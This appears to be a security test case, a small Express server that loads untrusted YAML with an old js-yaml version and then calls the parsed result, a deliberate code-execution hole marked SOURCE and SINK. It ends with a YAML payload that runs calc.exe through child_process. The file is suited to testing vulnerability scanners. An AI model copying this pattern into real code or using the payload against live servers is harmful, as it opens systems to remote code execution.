const express = require('express')
const yaml = require('js-yaml') // npm install js-yaml@2.0.4
const app = express()
app.use(express.text())
app.post('/parse', (req, res) => {
  // SOURCE
  const userControlledYaml = req.body
  param = userControlledYaml;

  try {
    // here
    let bar = 'safe';
    try {
        bar = param; // 赋值后执行 finally
    } finally {
        // SINK
        const parsedData = yaml.load(bar);
        const result = parsedData();
        res.json({ "result": result });
    }
  } catch (err) {
    res.status(500).send('error')
  }
})

app.listen(3000)

const maliciousYaml = `
!!js/function >
  function() {
    const process = global.require('child_process');
    process.execSync('calc.exe');
    return "Exploit succeeded";
  }
`